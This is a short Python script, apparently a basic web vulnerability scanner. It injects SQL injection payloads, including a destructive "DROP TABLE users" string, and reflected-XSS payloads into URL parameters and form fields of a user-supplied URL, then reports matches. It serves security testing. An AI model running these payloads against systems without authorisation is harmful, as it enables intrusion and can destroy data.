import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

SQL_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --", "\" OR \"1\"=\"1"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "\" onmouseover=alert(1) x=\""]

def get_all_forms(url):
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def is_vulnerable(response):
    errors = ["sql syntax", "unexpected end of SQL", "you have an error in your sql"]
    for error in errors:
        if error.lower() in response.text.lower():
            return True
    return False

def test_sql_injection(url):
    print("[+] Testing SQL Injection...")
    for payload in SQL_PAYLOADS:
        target_url = f"{url}?test={payload}"
        res = requests.get(target_url)
        if is_vulnerable(res):
            print(f"[!] SQL Injection vulnerability found with payload: {payload}")
            return
    print("[-] No SQL Injection vulnerability detected.")

def test_xss_in_forms(url):
    print("[+] Testing XSS in forms...")
    forms = get_all_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            data = {}
            for input in form_details["inputs"]:
                if input["name"]:
                    data[input["name"]] = payload
            target_url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = requests.post(target_url, data=data)
            else:
                res = requests.get(target_url, params=data)
            if payload in res.text:
                print(f"[!] XSS vulnerability found with payload: {payload}")
                return
    print("[-] No XSS vulnerability detected.")

def scan(url):
    print(f"Scanning {url}")
    test_sql_injection(url)
    test_xss_in_forms(url)

if __name__ == "__main__":
    target = input("Enter URL to scan (e.g., http://testphp.vulnweb.com): ")
    scan(target)